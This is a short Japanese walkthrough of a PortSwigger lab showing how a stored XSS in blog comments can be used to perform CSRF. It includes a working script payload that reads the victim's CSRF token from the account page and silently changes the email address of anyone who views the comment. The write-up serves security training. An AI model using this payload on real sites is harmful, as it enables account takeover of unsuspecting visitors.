# XSS を利用して CSRF を実行する

このラボには、ブログのコメント機能に保存された XSS の脆弱性が含まれています。

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

- 1. ハッキングラボにアクセスします
- 2. 一般ユーザーでログインします
- 3. ログインページのソースから、メールアドレスの更新方法が確認できます

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST"></form>
```

- 4. ホームページに移動し、ブログの以下のようにコメントをします

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open("get", "/my-account", true);
  req.send();
  function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open("post", "/my-account/change-email", true);
    changeReq.send("csrf=" + token + "&email=test@test.com");
  }
</script>
```

これでコメントを見た人はメールアドレスがtest@test.comに更新されるようになります
